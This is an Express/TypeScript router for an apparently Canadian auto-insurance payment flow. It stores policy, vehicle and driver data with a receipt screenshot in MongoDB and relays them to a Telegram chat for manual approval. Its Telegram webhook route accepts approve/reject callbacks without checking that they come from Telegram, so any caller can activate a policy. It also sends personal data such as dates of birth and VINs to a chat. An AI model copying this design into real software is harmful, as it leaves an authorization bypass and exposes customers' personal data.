import { Router } from 'express';
import { z } from 'zod';
import { validate } from '../middleware/validate.js';
import { getDB } from '../db/client.js';
import type { PolicyDoc } from '../types/index.js';

const router = Router();

const notifySchema = z.object({
  // Customer details
  policy_number:  z.string(),
  amount:         z.number(),
  coverage_type:  z.string(),
  term:           z.string(),
  deductible:     z.string(),
  // Vehicle
  vin:            z.string(),
  vehicle:        z.string(),
  // Driver
  license_class:  z.string(),
  dob:            z.string(),
  postal:         z.string(),
  // Screenshot as base64
  receipt_base64: z.string(),        // "data:image/png;base64,..."
  receipt_name:   z.string(),
});

// ─── GET /api/notify/status/:policyNumber (public — frontend status polling) ──
router.get('/status/:policyNumber', async (req, res, next) => {
  try {
    const db = getDB();
    const policy = await db.collection<PolicyDoc>('policies').findOne({ policy_number: req.params.policyNumber });
    if (!policy) {
      res.json({ status: 'pending' });
      return;
    }
    res.json({ status: policy.status, policy_number: policy.policy_number });
  } catch (err) {
    next(err);
  }
});

// ─── POST /api/notify/payment (public — called by the frontend) ──
router.post('/payment', validate(notifySchema), async (req, res, next) => {
  try {
    const d = req.body as z.infer<typeof notifySchema>;

    // 1. Save policy in MongoDB database
    const db = getDB();
    await db.collection<PolicyDoc>('policies').updateOne(
      { policy_number: d.policy_number },
      {
        $set: {
          policy_number: d.policy_number,
          status: 'pending',
          amount: d.amount,
          coverage_type: d.coverage_type,
          term: d.term,
          deductible: d.deductible,
          vin: d.vin,
          vehicle: d.vehicle,
          license_class: d.license_class,
          dob: d.dob,
          postal: d.postal,
          receipt_name: d.receipt_name,
          updated_at: new Date(),
        },
        $setOnInsert: { created_at: new Date() },
      },
      { upsert: true }
    );

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId   = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      // Telegram not configured — acknowledge anyway so frontend UX doesn't block
      res.json({ ok: true, telegram: false });
      return;
    }

    // 2. Build message caption with Telegram Markdown formatting
    const caption = [
      `📋 *New Payment Submission*`,
      ``,
      `*Policy:* \`${d.policy_number}\``,
      `*Amount:* $${d.amount} CAD`,
      `*Coverage:* ${d.coverage_type} — ${d.term}`,
      `*Deductible:* $${d.deductible}`,
      ``,
      `*Vehicle:* ${d.vehicle}`,
      `*VIN:* \`${d.vin}\``,
      ``,
      `*License:* ${d.license_class}`,
      `*DOB:* ${d.dob}`,
      `*Postal:* ${d.postal}`,
      ``,
      `*Status:* ⏳ Pending Admin Verification`,
    ].join('\n');

    // 3. Convert base64 image to Buffer
    const base64Data = d.receipt_base64.replace(/^data:[^;]+;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');
    const mimeType = d.receipt_base64.match(/^data:([^;]+);/)?.[1] || 'image/jpeg';
    const fileName = d.receipt_name || 'receipt.jpg';

    // 4. Create Telegram Inline Keyboard Buttons (Approve / Reject)
    const replyMarkup = JSON.stringify({
      inline_keyboard: [
        [
          { text: '✅ Approve & Activate', callback_data: `approve:${d.policy_number}` },
          { text: '❌ Reject', callback_data: `reject:${d.policy_number}` },
        ],
      ],
    });

    const sendViaMethod = async (method: 'sendPhoto' | 'sendDocument', fieldName: string) => {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('caption', caption);
      form.append('parse_mode', 'Markdown');
      form.append('reply_markup', replyMarkup);
      form.append(fieldName, new Blob([imageBuffer], { type: mimeType }), fileName);
      const res = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, { method: 'POST', body: form });
      return res.json() as Promise<{ ok: boolean; description?: string; result?: { message_id?: number } }>;
    };

    // Try sendPhoto first; fall back to sendDocument if needed
    let tgBody = await sendViaMethod('sendPhoto', 'photo');
    if (!tgBody.ok) {
      console.error('[telegram] sendPhoto failed:', tgBody.description, '— retrying as document');
      tgBody = await sendViaMethod('sendDocument', 'document');
    }

    if (tgBody.ok && tgBody.result?.message_id) {
      await db.collection<PolicyDoc>('policies').updateOne(
        { policy_number: d.policy_number },
        { $set: { telegram_message_id: tgBody.result.message_id, telegram_chat_id: chatId } }
      );
    } else if (!tgBody.ok) {
      console.error('[telegram] sendDocument also failed:', tgBody.description);
    }

    res.json({ ok: true, telegram: tgBody.ok });
  } catch (err) {
    next(err);
  }
});

// ─── POST /api/notify/telegram-webhook (handles button clicks in Telegram) ──
router.post('/telegram-webhook', async (req, res) => {
  // Always return 200 immediately to Telegram so it doesn't retry
  res.sendStatus(200);

  try {
    const update = req.body;
    if (!update || !update.callback_query) return;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const callback = update.callback_query;
    const data = callback.data as string;
    const message = callback.message;

    if (!data || (!data.startsWith('approve:') && !data.startsWith('reject:'))) return;

    const [action, policyNumber] = data.split(':');
    const isApprove = action === 'approve';
    const newStatus = isApprove ? 'active' : 'rejected';

    const db = getDB();
    const policy = await db.collection<PolicyDoc>('policies').findOne({ policy_number: policyNumber });

    if (policy) {
      await db.collection<PolicyDoc>('policies').updateOne(
        { policy_number: policyNumber },
        { $set: { status: newStatus, updated_at: new Date() } }
      );
    }

    // 1. Send feedback pop-up to admin in Telegram
    if (botToken && callback.id) {
      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: callback.id,
          text: isApprove ? `✅ Policy ${policyNumber} Approved & Activated!` : `❌ Policy ${policyNumber} Rejected.`,
          show_alert: true,
        }),
      }).catch(() => {});
    }

    // 2. Edit Telegram message caption to show final status and remove action buttons
    if (botToken && message && message.chat && message.message_id) {
      const origCaption = message.caption || `Policy ${policyNumber}`;
      const statusBanner = isApprove
        ? `\n\n✅ *STATUS: APPROVED & ACTIVATED*\n_Customer pink card unlocked!_`
        : `\n\n❌ *STATUS: REJECTED*`;
      
      const newCaption = origCaption.replace(/\n\*Status:\*.*$/m, '') + statusBanner;

      await fetch(`https://api.telegram.org/bot${botToken}/editMessageCaption`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          caption: newCaption,
          parse_mode: 'Markdown',
          reply_markup: { inline_keyboard: [] }, // Remove buttons after action
        }),
      }).catch(() => {});
    }
  } catch (err) {
    console.error('[telegram-webhook] Error handling update:', err);
  }
});

export default router;
